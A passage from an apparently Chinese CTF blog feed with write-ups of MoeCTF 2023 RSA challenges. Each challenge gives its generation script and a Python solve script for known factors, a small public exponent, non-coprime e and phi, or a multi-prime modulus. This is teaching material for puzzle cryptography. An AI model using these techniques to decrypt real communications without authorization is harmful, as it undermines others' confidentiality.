class="hljs-built_in">pow</span>(c, d, n)<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(m))<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># print(long_to_bytes(m))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF 2023</title>
    <link href="/2023/09/24/MoeCTF%202023/"/>
    <url>/2023/09/24/MoeCTF%202023/</url>
    
    <content type="html"><![CDATA[<p>（仅有部分题目</p><h2 id="crypto-入门指北">Crypto 入门指北</h2><h3 id="main_py">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag <span class="hljs-comment"># 这个secret不是一个库，flag是你要自己求出来的，所以不要问为什么找不到这个库了（</span><br><br>p,q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>) <span class="hljs-comment"># 随机生成了两个质数</span><br>e = <span class="hljs-number">65537</span> <span class="hljs-comment"># 这是什么？</span><br>n = p*q<br>m = <span class="hljs-built_in">int</span>.from_bytes(flag.encode(),<span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># 把flag编码成bytes，再转换成一个长整数</span><br>c = <span class="hljs-built_in">pow</span>(m,e,n) <span class="hljs-comment"># RSA加密！</span><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment"># p = 0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7</span><br><span class="hljs-comment"># q = 0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb</span><br><span class="hljs-comment"># c = 0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296</span><br></code></pre></td></tr></table></figure><blockquote><p><code>m = int.from_bytes(flag.encode(),"big")</code></p><p>这行代码的作用是将字符串 <code>flag</code> 转换成一个大整数<code>m</code>。具体解释如下：</p><ul><li><code>flag</code>:这是一个字符串，通常包含需要进行加密或其他操作的敏感信息，例如密码或标志。</li><li><code>flag.encode()</code>: 这是将字符串 <code>flag</code>转换为字节序列的操作。在计算机中，所有的数据最终都会以字节的形式表示。<code>encode()</code>方法将字符串编码为字节，使用默认的编码方式（通常是UTF-8）。</li><li><code>"big"</code>:这是一个参数，它告诉Python将字节序列视为一个大端（big-endian）的整数。在大端表示法中，高位字节在前，低位字节在后。这是一种常见的表示整数的方式。</li><li><code>int.from_bytes(...)</code>:这是一个方法，用于将字节序列转换为整数。它接受两个参数，第一个参数是要转换的字节序列，第二个参数是表示字节序列顺序的字符串，这里是<code>"big"</code>。它会将字节序列按照指定的顺序解释为一个整数。</li></ul><p>因此，<code>m</code> 将包含了从字符串 <code>flag</code>转换而来的整数表示。在加密算法中，通常会将明文消息转换成整数形式，以便进行数学运算，例如RSA加密中的指数运算。</p></blockquote><blockquote><p><code>c = pow(m,e,n)</code></p><p>这行代码实现了RSA（Rivest–Shamir–Adleman）加密的核心操作。具体解释如下：</p><ul><li><code>m</code>:这是明文消息的整数表示。在RSA加密中，明文消息通常首先被编码成一个整数，这个整数在加密过程中被处理。</li><li><code>e</code>:这是RSA加密算法中的公钥指数。它是一个正整数，通常是65537。公钥指数是用于加密消息的指数。</li><li><code>n</code>:这是RSA加密算法中的模数（或称为模ulus）。它是两个大素数 p 和 q的乘积。模数在RSA加密和解密过程中都会用到。</li><li><strong><code>pow(m, e, n)</code>: 这是Python中的一个函数，用于计算m 的 e 次方除以 n的余数</strong>。也就是说，它执行的是模指数运算。在RSA加密中，这等效于对明文消息m 进行加密操作。</li></ul><p>最终，<code>c</code>将包含加密后的密文，它是整数形式的，可以通过RSA私钥进行解密，从而还原为原始的明文消息<code>m</code>。RSA是一种非对称加密算法，公钥用于加密，私钥用于解密，这使得只有拥有私钥的人才能够解密密文。</p></blockquote><p><strong><em>哦~~，这里就是说flag是不知道的，就是让我们求一下flag</em></strong></p><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> * <span class="hljs-comment"># 一个非常好用的crypto库</span><br><br>p = <span class="hljs-number">0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7</span><br>q = <span class="hljs-number">0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb</span><br>c = <span class="hljs-number">0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296</span><br>e = <span class="hljs-number">65537</span><br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>) <span class="hljs-comment"># 你知道什么是 欧拉函数吗 [1]</span><br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi) <span class="hljs-comment"># 什么是乘法逆元？ [2]</span><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>相当于我们知道了p，q，c，e，然后求m，那就求出 n 和 d 即可</p><p>所以关键的就是求d</p><blockquote><p><code>d = pow(e, -1, phi)</code></p><p>这行代码计算了私钥 <code>d</code>，它是公钥指数 <code>e</code> 在模<code>phi</code> 下的乘法逆元。</p><p>因为 e 和 d之间一定满足：<code>(e * d) % phi(n) = 1</code>，即<code>e*d ≡ 1(mod φ(N))</code></p><p>这行代码其实跟之前 <em>[SWPUCTF 2021 新生赛]ez_rsa</em>解密代码中<code>d = gmpy2.invert(e, phi)</code>是一个意思</p></blockquote><ul class="task-list"><li><label><input type="checkbox" />由$ e*d ≡ 1(mod φ(N)) $可以得出 $e^{-1} ≡ d(mod φ(N)) $ 吗？</label></li></ul><p>答案是可以的，经过简单的运算即可得到</p><p>知识：<ahref="%5B乘法逆元%20-%20OI%20Wiki%20(oi-wiki.org)%5D(https://oi-wiki.org/math/number-theory/inverse/#定义)">乘法逆元</a>、<ahref="%5B欧拉函数%20-%20OI%20Wiki%20(oi-wiki.org)%5D(https://oi-wiki.org/math/number-theory/euler/)">欧拉函数</a>等</p><hr /><h2 id="baby_e">baby_e</h2><h3 id="main_py-1">main_py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><br>p,q = getPrime(<span class="hljs-number">2048</span>),getPrime(<span class="hljs-number">2048</span>)<br>e = <span class="hljs-number">7</span><br>n = p*q<br>m = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read().strip())<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>,n)<br><br><span class="hljs-comment"># c =  147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span><br><span class="hljs-comment"># n =  553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span><br></code></pre></td></tr></table></figure><h3 id="exp-1">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>c = <span class="hljs-number">147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span><br>n = <span class="hljs-number">553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span><br>e = <span class="hljs-number">7</span>       <span class="hljs-comment"># 但是我们不知道p和q啊，这怎么求啊</span><br><br><br>a, b = gmpy2.iroot(c, <span class="hljs-number">7</span>)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-comment"># print(a)</span><br><br></code></pre></td></tr></table></figure><p>思路（very very very 感谢峰哥（<del>其实是学弟，惭愧</del>））：</p><p>小公钥指数攻击：</p><ul><li>因为 e 很小，n 很大</li><li>所以明文 m 乘了 e 次方也没到 n ，n 根本没用到</li><li>所以 c直接开7次根就是明文了，这里要用<code>gmpy2.iroot(c, 7)</code>，而不能<code>pow(c,1/7)</code>，后者算不动</li><li>找时间去看：<ahref="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/">公钥指数相关攻击- CTF Wiki (ctf-wiki.org)</a></li></ul><hr /><h2 id="bad_e">bad_E</h2><h3 id="main">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-built_in">print</span>(p) <span class="hljs-comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span><br><span class="hljs-built_in">print</span>(q) <span class="hljs-comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fs:<br>    flag = fs.read().strip()<br><br>m = bytes_to_long(flag.encode())<br>c = <span class="hljs-built_in">pow</span>(m,e,p*q)<br><span class="hljs-built_in">print</span>(c) <span class="hljs-comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span><br><br></code></pre></td></tr></table></figure><h3 id="exp-2">exp</h3><p>参考下面的博客：</p><p><ahref="https://blog.csdn.net/qq_57235775/article/details/132575196?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=e和phi不互素&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-132575196.142%5Ev94%5EchatsearchT3_1&amp;spm=1018.2226.3001.4187">e与phi不互素的情况_余切66的博客-CSDN博客</a></p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1694699685619.png"alt="1694699685619" /><figcaption aria-hidden="true">1694699685619</figcaption></figure><p>e和phi不互素，本题是gcd(e,q-1)=1，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> * <span class="hljs-comment"># 一个非常好用的crypto库</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span><br>q = <span class="hljs-number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span><br><br>c = <span class="hljs-number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-built_in">print</span>(gcd(e,q-<span class="hljs-number">1</span>))<br><br><br>phi = q-<span class="hljs-number">1</span><br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,q)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="factor_signin">factor_signin</h2><h3 id="main-1">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> prod<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read().strip()<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">72</span><br><br>m1 = <span class="hljs-built_in">int</span>.from_bytes(flag[:<span class="hljs-number">36</span>],<span class="hljs-string">&quot;big&quot;</span>)<br>m2 = <span class="hljs-built_in">int</span>.from_bytes(flag[<span class="hljs-number">36</span>:],<span class="hljs-string">&quot;big&quot;</span>)<br><br>e = <span class="hljs-number">65537</span><br><br>p,q = getPrime(<span class="hljs-number">2048</span>),getPrime(<span class="hljs-number">2048</span>)<br>n1 = p*q<br>c1 = <span class="hljs-built_in">pow</span>(m1,e,n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 = &quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n1 = &quot;</span>,n1)<br><br>primes = [getPrime(<span class="hljs-number">64</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br>n2 = prod(primes)<br>c2 = <span class="hljs-built_in">pow</span>(m2,e,n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 = &quot;</span>,c2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n2 = &quot;</span>,n2)<br><br><span class="hljs-comment"># c1 =  10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-comment"># n1 =  343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span><br><span class="hljs-comment"># c2 =  4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br><span class="hljs-comment"># n2 =  8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br></code></pre></td></tr></table></figure><h3 id="exp-3">exp</h3><p>前半部分：直接分解n1</p><p>后半部分：n2是多个素数的乘积，求欧拉函数，我教过你吧😋<del>（但是这个脚本我还真第一次见</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br>e = <span class="hljs-number">65537</span><br><br>c1 =  <span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br>n1 =  <span class="hljs-number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span><br>c2 =  <span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br>n2 =  <span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><br>p1 = <span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br>q1 = <span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br><br>phi = (p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>d = invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c1,d,n1)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><br>factor = <span class="hljs-string">&#x27;&#x27;&#x27;P20 = 14745811312384518031</span><br><span class="hljs-string">P20 = 18345408081492711641</span><br><span class="hljs-string">P20 = 14678737767649343977</span><br><span class="hljs-string">P20 = 14619040595108594017</span><br><span class="hljs-string">P19 = 9949603102225364603</span><br><span class="hljs-string">P20 = 12034779627328165471</span><br><span class="hljs-string">P20 = 10596280721192026229</span><br><span class="hljs-string">P20 = 15211380502610462057</span><br><span class="hljs-string">P20 = 14813953870710226847</span><br><span class="hljs-string">P20 = 13062839684118954553</span><br><span class="hljs-string">P20 = 15332916111580607077</span><br><span class="hljs-string">P20 = 16870346804576162551</span><br><span class="hljs-string">P20 = 11092420583960163379</span><br><span class="hljs-string">P20 = 14397830993057803133</span><br><span class="hljs-string">P20 = 16123604149048919099</span><br><span class="hljs-string">P20 = 13645878578452317313</span><br><span class="hljs-string">P20 = 17093292308638969889</span><br><span class="hljs-string">P20 = 17289161209347211817</span><br><span class="hljs-string">P20 = 15175734709842430433</span><br><span class="hljs-string">P20 = 15751974537676958401</span><br><span class="hljs-string">P20 = 10864078180916418691</span><br><span class="hljs-string">P20 = 17673334943789572513</span><br><span 